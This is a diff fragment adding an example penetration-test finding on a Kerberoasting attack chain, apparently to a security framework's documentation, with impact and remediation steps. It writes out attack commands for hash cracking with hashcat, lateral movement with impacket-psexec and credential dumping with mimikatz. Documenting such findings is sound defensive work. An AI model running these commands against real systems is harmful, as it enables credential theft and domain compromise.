+2. Cracked hash: hashcat -m 13100 hash.txt rockyou.txt (cracked in 12m: Summer2023!)
+3. Lateral movement: impacket-psexec corp.example.com/SVC-SQL:Summer2023!@db-server-01
+4. Credential extraction: mimikatz sekurlsa::logonpasswords -> Domain Admin NTLM hash
+
+**Impact**:
+Complete domain compromise from a single low-privilege domain user account. An attacker
+could access all 5,000 user accounts, 800 computer objects, and all data within the domain.
+
+**Remediation**:
+1. Set a 25+ character randomly generated password for SVC-SQL and all service accounts
+2. Migrate to Group Managed Service Accounts (gMSA) which rotate 120-character passwords automatically
+3. Enable AES256 encryption for Kerberos and disable RC4 (DES) encryption
+4. Remove SVC-SQL from local administrator groups on DB-SERVER-01
+5. Implement Protected Users group for privileged accounts to prevent credential caching
+6. Deploy Microsoft Defender for Identity to detect Kerberoasting and DCSync attacks
+```
 
 ---
  2026 Galyarder Labs. Galyarder Framework.
